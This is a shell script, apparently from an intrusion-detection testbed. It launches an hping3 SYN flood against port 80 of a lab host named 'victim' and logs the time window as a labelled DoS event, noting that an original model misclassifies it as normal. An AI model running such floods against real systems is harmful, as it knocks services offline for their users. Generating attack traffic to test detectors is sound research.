#!/bin/sh
# SYN flood against ONE port of the victim (a "DoS" attack). The original model labels this Normal.
# Usage: synflood.sh [seconds] [microseconds_between_packets]    defaults 20 and 5000 (about 200 packets/s)
. /attacks/lib.sh
DURATION="${1:-20}"
GAP="${2:-5000}"
echo "SYN flood, single port: ${DURATION}s, about $((1000000 / GAP)) packets per second, target: victim:80"
T0=$(now)
timeout "$DURATION" hping3 -S -p 80 -i "u${GAP}" victim
log_window DoS synflood_single_port "$T0"
echo "SYN flood finished"
